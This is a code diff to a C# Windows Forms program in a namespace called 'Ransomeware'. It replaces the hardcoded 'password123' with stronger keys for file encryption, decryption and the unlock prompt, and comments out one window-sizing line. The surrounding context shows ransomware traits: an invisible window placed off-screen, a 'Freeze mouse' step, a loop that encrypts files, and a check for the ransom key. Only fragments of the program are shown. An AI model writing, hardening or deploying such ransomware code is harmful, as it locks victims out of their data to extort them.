@@ -45,7 +45,7 @@ namespace Ransomeware
                 MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
             //If you write correct key
-            else if (codeBox.Text == "password123") 
+            else if (codeBox.Text == "A&Cge?s2r;`3.T#U") 
             {
                 flag = true;
                 MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -79,7 +79,7 @@ namespace Ransomeware
             this.Opacity = 0.0;
 
             //Invisible
-            this.Size = new Size(50, 50);      
+           // this.Size = new Size(50, 50);      
             Location = new Point(-100, -100);
 
             //Freeze mouse
@@ -268,7 +268,7 @@ namespace Ransomeware
             EncryptionFile enc = new EncryptionFile();
 
             //your password
-            string password = "password123"; 
+            string password = "A1Cg4x9e2sr6q3TzU"; 
 
             for (int i = 0; i < files.Length; i++)
             {
@@ -296,7 +296,7 @@ namespace Ransomeware
 
             DecryptionFile dec = new DecryptionFile();
 
-            string password = "password123";
+            string password = "A1Cg4x9e2sr6q3TzU";
 
             for (int i = 0; i < files.Length; i++)
             {
